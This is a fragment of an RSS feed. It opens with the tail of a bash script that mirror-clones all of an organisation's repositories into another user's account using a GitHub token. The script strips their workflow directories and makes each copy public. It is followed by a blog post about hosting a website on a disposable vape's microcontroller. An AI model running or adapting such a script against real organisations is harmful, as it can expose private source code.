</span><span>then</span></p></div><div><p><span>sleep</span><span>600</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/user/repos"</span><span>"POST"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.name'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>fi</span></p></div><div><p><span>fi</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to make a repository public ---</span></p></div><div><p><span>make_repo_public</span><span>() {</span></p></div><div><p><span>local</span><span> repo_name</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> repo_data</span></p></div><div><p><span>repo_data</span><span>=</span><span>$(</span><span>cat</span><span>&lt;&lt;</span><span>EOF</span></p></div><div><p><span>{</span></p></div><div><p><span>"private": false</span></p></div><div><p><span>}</span></p></div><div><p><span>EOF</span></p></div><div><p><span>)</span></p></div><div><p><span>local</span><span> response</span></p></div><div><p><span>response</span><span>=</span><span>$(</span><span>github_api</span><span>"/repos/</span><span>$TARGET_USER</span><span>/</span><span>$repo_name</span><span>"</span><span>"PATCH"</span><span>"</span><span>$repo_data</span><span>"</span><span>)</span></p></div><div><p><span>local</span><span> http_code</span><span>=</span><span>"${</span><span>response</span><span>:</span><span>-3</span><span>}"</span></p></div><div><p><span>local</span><span> body</span><span>=</span><span>"${</span><span>response</span><span>%</span><span>???}"</span></p></div><div><p><span>if</span><span>echo</span><span>"</span><span>$body</span><span>"</span><span>|</span><span>jq</span><span>-e</span><span>'.private == false'</span><span>&gt;</span><span>/dev/null</span><span>2&gt;&amp;1</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>else</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to migrate a repository using git mirror ---</span></p></div><div><p><span>migrate_repo</span><span>() {</span></p></div><div><p><span>local</span><span> source_clone_url</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> target_clone_url</span><span>=</span><span>"</span><span>$2</span><span>"</span></p></div><div><p><span>local</span><span> migration_name</span><span>=</span><span>"</span><span>$3</span><span>"</span></p></div><div><p><span>local</span><span> repo_dir</span><span>=</span><span>"</span><span>$TEMP_DIR</span><span>"</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>clone</span><span>--mirror</span><span>"</span><span>$source_clone_url</span><span>"</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>cd</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>remote</span><span>set-url</span><span>origin</span><span>"</span><span>$target_clone_url</span><span>"</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span># Temporarily convert to a regular repo to remove workflows</span></p></div><div><p><span>git</span><span>config</span><span>--unset</span><span>core.bare</span></p></div><div><p><span>git</span><span>reset</span><span>--hard</span></p></div><div><p><span># Remove workflows directory and commit the change</span></p></div><div><p><span>if</span><span> [[ </span><span>-d</span><span>".github/workflows"</span><span> ]]; </span><span>then</span></p></div><div><p><span>rm</span><span>-rf</span><span>.github/workflows</span></p></div><div><p><span>git</span><span>add</span><span>-A</span></p></div><div><p><span>git</span><span>commit</span><span>-m</span><span>"Remove GitHub workflows directory"</span></p></div><div><p><span>fi</span></p></div><div><p><span># Convert back to a bare repo for mirroring</span></p></div><div><p><span>git</span><span>config</span><span>core.bare</span><span>true</span></p></div><div><p><span>rm</span><span>-rf</span><span>*</span></p></div><div><p><span>if</span><span>!</span><span>git</span><span>push</span><span>--mirror</span><span>2&gt;</span><span>/dev/null</span><span>; </span><span>then</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>return</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>cd</span><span>-</span><span>&gt;</span><span>/dev/null</span></p></div><div><p><span>rm</span><span>-rf</span><span>"</span><span>$repo_dir</span><span>/</span><span>$migration_name</span><span>"</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Function to process the list of repositories ---</span></p></div><div><p><span>process_repositories</span><span>() {</span></p></div><div><p><span>local</span><span> repos</span><span>=</span><span>"</span><span>$1</span><span>"</span></p></div><div><p><span>local</span><span> total_repos</span></p></div><div><p><span>total_repos</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$repos</span><span>"</span><span>|</span><span>jq</span><span>length</span><span>)</span></p></div><div><p><span>if</span><span> [[ </span><span>"</span><span>$total_repos</span><span>"</span><span>-eq</span><span>0</span><span> ]]; </span><span>then</span></p></div><div><p><span>return</span><span>0</span></p></div><div><p><span>fi</span></p></div><div><p><span>local</span><span> success_count</span><span>=</span></p></div><div><p><span> </span><span>local</span><span> failure_count</span><span>=</span></p></div><div><p><span> </span><span>for</span><span> i </span><span>in</span><span> $(</span><span>seq</span><span>0</span><span> $((</span><span>total_repos</span><span>-</span><span>1</span><span>))); </span><span>do</span></p></div><div><p><span>local</span><span> repo</span></p></div><div><p><span>repo</span><span>=</span><span>$(</span><span>echo</span><span>"</span><span>$repos</span><span>"</span><span>|</span><span>jq</span><span>-r</span><span>".[</span><span>$i</span><span>]"</span><span>)</span></p></div><div><p><span>local</span><span> migration_name</span><span>=</span><span>"${</span><span>repo</span><span>//</span><span>\/</span><span>/</span><span>-</span><span>}-migration"</span></p></div><div><p><span>local</span><span> auth_source_url</span><span>=</span><span>"https://</span><span>$GITHUB_TOKEN</span><span>@github.com/</span><span>$repo</span><span>.git"</span></p></div><div><p><span>local</span><span> auth_target_url</span><span>=</span><span>"https://</span><span>$GITHUB_TOKEN</span><span>@github.com/</span><span>$TARGET_USER</span><span>/</span><span>$migration_name</span><span>.git"</span></p></div><div><p><span>echo</span><span>"Migrating </span><span>$repo</span><span> to </span><span>$TARGET_USER</span><span>/</span><span>$migration_name</span><span>..."</span></p></div><div><p><span>if</span><span>create_repo</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>if</span><span>migrate_repo</span><span>"</span><span>$auth_source_url</span><span>"</span><span>"</span><span>$auth_target_url</span><span>"</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>if</span><span>make_repo_public</span><span>"</span><span>$migration_name</span><span>"</span><span>; </span><span>then</span></p></div><div><p><span>echo</span><span>" -&gt; Success: Migrated and made public."</span></p></div><div><p><span>((success_count</span><span>++</span><span>))</span></p></div><div><p><span>else</span></p></div><div><p><span># Still counts as a success if migration worked but public toggle failed</span></p></div><div><p><span>echo</span><span>" -&gt; Warning: Migrated but failed to make public."</span></p></div><div><p><span>((success_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>else</span></p></div><div><p><span>echo</span><span>" -&gt; Error: Migration failed."</span></p></div><div><p><span>((failure_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>else</span></p></div><div><p><span>echo</span><span>" -&gt; Error: Could not create target repository."</span></p></div><div><p><span>((failure_count</span><span>++</span><span>))</span></p></div><div><p><span>fi</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"-------------------------------------"</span></p></div><div><p><span>echo</span><span>"Migration Complete."</span></p></div><div><p><span>echo</span><span>"Successful: </span><span>$success_count</span><span>"</span></p></div><div><p><span>echo</span><span>"Failed: </span><span>$failure_count</span><span>"</span></p></div><div><p><span>echo</span><span>"-------------------------------------"</span></p></div><div><p><span>return</span><span> $failure_count</span></p></div><div><p><span>}</span></p></div><div><p><span># --- Main execution block ---</span></p></div><div><p><span>main</span><span>() {</span></p></div><div><p><span># Check for required command-line tools</span></p></div><div><p><span>for</span><span> tool </span><span>in</span><span>curl</span><span>jq</span><span>git</span><span>; </span><span>do</span></p></div><div><p><span>if</span><span>!</span><span>command</span><span>-v</span><span>"</span><span>$tool</span><span>"</span><span> &amp;</span><span>&gt;</span><span> /dev/null; </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Required tool '</span><span>$tool</span><span>' is not installed."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>done</span></p></div><div><p><span>echo</span><span>"Fetching repositories from </span><span>$SOURCE_ORG</span><span>..."</span></p></div><div><p><span>local</span><span> repos</span></p></div><div><p><span>if</span><span>!</span><span> repos</span><span>=</span><span>$(</span><span>get_all_repos</span><span>"</span><span>$SOURCE_ORG</span><span>"</span><span>); </span><span>then</span></p></div><div><p><span>echo</span><span>"Error: Failed to fetch repositories from </span><span>$SOURCE_ORG</span><span>."</span></p></div><div><p><span>exit</span><span>1</span></p></div><div><p><span>fi</span></p></div><div><p><span>process_repositories</span><span>"</span><span>$repos</span><span>"</span></p></div><div><p><span>}</span></p></div><div><p><span># Run main function with provided arguments</span></p></div><div><p><span>main</span><span>"</span><span>$@</span><span>"</span></p></div></code></pre></figure></div></div></section>]]></description><pubDate>Tue, 16 Sep 2025 16:40:37 +0530</pubDate></item><item><link>https://bogdanthegeek.github.io/blog/projects/vapeserver/</link><title>Hosting a website on a disposable vape (bogdanthegeek.github.io)</title><guid isPermaLink="true">https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/</guid><comments>https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/</comments><description><![CDATA[<section class='reading-time-and-permalink'><p>Reading time: 8 min | <a href='https://www.reddit.com/r/programming/comments/1nhs5ti/hosting_a_website_on_a_disposable_vape/'>Post permalink</a></p></section><section class='preview-image'><img src='https://bogdanthegeek.github.io/blog/images/vapeserver.jpg' /></section><section class='parsed-content'><div><h2>Preface<a href="https://bogdanthegeek.github.io#preface">#</a></h2><p>This article is <em>NOT</em> served from a web server running on a disposable vape. If you want to see the real deal, click <a href="http://ewaste.fka.wtf">here</a>. The content is otherwise identical.</p><h2>Background<a href="https://bogdanthegeek.github.io#background">#</a></h2><p>For a couple of years now, I have been collecting disposable vapes from friends and family. Initially, I only salvaged the batteries for &ldquo;future&rdquo; projects (It&rsquo;s not hoarding, I promise), but recently, disposable vapes have gotten more advanced. I wouldn&rsquo;t want to be the lawyer who one day will have to argue how a device with USB C and a rechargeable battery can be classified as &ldquo;disposable&rdquo;. Thankfully, I don&rsquo;t plan on pursuing law anytime soon.</p><p>Last year, I was tearing apart some of these fancier pacifiers for adults when I noticed something that caught my eye, instead of the expected black blob of goo hiding some ASIC (Application Specific Integrated Circuit) I see a little integrated circuit inscribed &ldquo;PUYA&rdquo;. I don&rsquo;t blame you if this name doesn&rsquo;t excite you as much it does me, most people have never heard of them. They are most well known for their flash chips, but I first came across them after reading Jay Carlson&rsquo;s blog post about <a href="https://jaycarlson.net/2023/02/04/the-cheapest-flash-microcontroller-you-can-buy-is-actually-an-arm-cortex-m0/">the cheapest flash microcontroller you can buy</a>. They are quite capable little ARM Cortex-M0+ micros.</p><p>Over the past year I have collected quite a few of these PY32 based vapes, all of them from different models of vape from the same manufacturer. It&rsquo;s not my place to do free advertising for big tobacco, so I won&rsquo;t mention the brand I got it from, but if anyone who worked on designing them reads this, thanks for labeling the debug pins!</p><h2>What are we working with<a href="https://bogdanthegeek.github.io#what-are-we-working-with">#</a></h2><p>The chip is marked <code>PUYA C642F15</code>, which wasn&rsquo;t very helpful. I was pretty sure it was a <code>PY32F002A</code>, but after poking around with <a href="http://pyocd.io/">pyOCD</a>, I noticed that the flash was 24k and we have 3k of RAM. The extra flash meant that it was more likely a <code>PY32F002B</code>, which is actually a very different chip.<sup><a href="https://bogdanthegeek.github.io#fn:1">1</a></sup></p><p>So here are the specs of a microcontroller so <em>bad</em>, it&rsquo;s basically disposable:</p><ul><li>24MHz Coretex M0+</li><li>24KiB of Flash Storage</li><li>3KiB of Static RAM</li><li>a few peripherals, none of which we will use.</li></ul><p>You may look at those specs and think that it&rsquo;s not much to work with. I don&rsquo;t blame you, a 10y old phone can barely load google, and this is about 100x slower. I on the other hand see a <em>blazingly</em> fast web server.</p><h2>Getting online<a href="https://bogdanthegeek.github.io#getting-online">#</a></h2><p>The idea of hosting a web server on a vape didn&rsquo;t come to me instantly. In fact, I have been playing around with them for a while, but after writing my post on <a href="https://bogdanthegeek.github.io/blog/insights/jlink-rtt-for-the-masses/">semihosting</a>, the penny dropped.</p><p>If you don&rsquo;t feel like reading that article, semihosting is basically syscalls for embedded ARM microcontrollers. You throw some values/pointers into some registers and call a breakpoint instruction. An attached debugger interprets the values in the registers and performs certain actions. Most people just use this to get some logs printed from the microcontroller, but they are actually bi-directional.</p><p>If you are older than me, you might remember a time before Wi-Fi and Ethernet, the dark ages, when you had to use dial-up modems to get online. You might also know that the ghosts of those modems still linger all around us. Almost all USB serial devices actually emulate those modems: a 56k modem is just 57600 baud serial device. Data between some of these modems was transmitted using a protocol called SLIP (Serial Line Internet Protocol).<sup><a href="https://bogdanthegeek.github.io#fn:2">2</a></sup></p><p>This may not come as a surprise, but Linux (and with some tweaking even macOS) supports SLIP. The <code>slattach</code> utility can make any <code>/dev/tty*</code> send and receive IP packets. All we have to do is put the data down the wire in the right format and provide a virtual tty. This is actually easier than you might imagine, pyOCD can forward all semihosting though a telnet port. Then, we use <code>socat</code> to link that port to a virtual tty:</p><div><pre><code><span><span>pyocd gdb -S -O semihost_console_type<span>=</span>telnet -T <span>$(</span>PORT<span>)</span> <span>$(</span>PYOCDFLAGS<span>)</span> &amp; </span></span><span><span>socat PTY,link<span>=</span><span>$(</span>TTY<span>)</span>,raw,echo<span>=</span> TCP:localhost:<span>$(</span>PORT<span>)</span>,nodelay &amp; </span></span><span><span>sudo slattach -L -p slip -s <span>115200</span> <span>$(</span>TTY<span>)</span> &amp; </span></span><span><span>sudo ip addr add 192.168.190.1 peer 192.168.190.2/24 dev sl0 </span></span><span><span>sudo ip link set mtu <span>1500</span> up dev sl0 </span></span></code></pre></div><p>Ok, so we have a &ldquo;modem&rdquo;, but that&rsquo;s hardly a web server. To actually talk TCP/IP, we need an IP stack. There are many choices, but I went with <a href="https://github.com/adamdunkels/uip/tree/uip-0-9">uIP</a> because it&rsquo;s pretty small, doesn&rsquo;t require an RTOS, and it&rsquo;s easy to port to other platforms. It also, helpfully, comes with a very minimal HTTP server example.</p><p>After porting the SLIP code to use semihosting, I had a working web server&hellip;half of the time. As with most highly optimised libraries, uIP was designed for 8 and 16-bit machines, which rarely have memory alignment requirements. On ARM however, if you dereference a <code>u16 *</code>, you better hope that address is even, or you&rsquo;ll get an exception. The <code>uip_chksum</code> assumed <code>u16</code> alignment, but the script that creates the filesystem didn&rsquo;t. I actually decided to modify a bit the structure of the filesystem to make it a bit more portable. This was my first time working with <code>perl</code> and I have to say, it&rsquo;s quite well suited to this kind of task.</p><h2>Blazingly fast<a href="https://bogdanthegeek.github.io#blazingly-fast">#</a></h2><p>So how fast is a web server running on a disposable microcontroller. Well, initially, not very fast. Pings took ~1.5s with 50% packet loss and a simple page took over 20s to load. That&rsquo;s so bad, it&rsquo;s actually funny, and I kind of wanted to leave it there.</p><p>However, the problem was actually between the seat and the steering wheel the whole time. The first implementation read and wrote a single character at a time, which had a massive overhead associated with it. I previously benchmarked semihosting on this device, and I was getting ~20KiB/s, but uIP&rsquo;s SLIP implementation was designed for very low memory devices, so it was serialising the data byte by byte. We have a whopping 3kiB of RAM to play with, so I added a ring buffer to cache reads from the host and feed them into the SLIP poll function. I also split writes in batches to allow for escaping.</p><p>Now this is what I call blazingly fast! Pings now take 20ms, no packet loss and a full page loads in about 160ms. This was using using almost all of the RAM, but I could also dial down the sizes of the buffer to have more than enough headroom to run other tasks. The project repo has everything set to a nice balance latency and RAM usage:</p><pre><code>Memory region Used Size Region Size %age Used FLASH: 5116 B 24 KB 20.82% RAM: 1380 B 3 KB 44.92% </code></pre><p>For this blog however, I paid for none of the RAM, so I&rsquo;ll use all of the RAM.</p><p>As you may have noticed, we have just under 20kiB (80%) of storage space. That may not be enough to ship all of React, but as you can see, it&rsquo;s more than enough to host this entire blog post. And this is not just a static page server, you can run any server-side code you want, if you know C that is.</p><p>Just for fun, I added a json api endpoint to get the number of requests to the main page (since the last crash) and the unique ID of the microcontroller.</p><h2>Resources<a href="https://bogdanthegeek.github.io#resources">#</a></h2><ul><li><a href="https://github.com/BogdanTheGeek/semihost-ip">Code for this project</a></li></ul></div></section>]]></description><pubDate>Mon, 15 Sep 2025 22:55:15 +0530</pubDate></item></channel></rss>
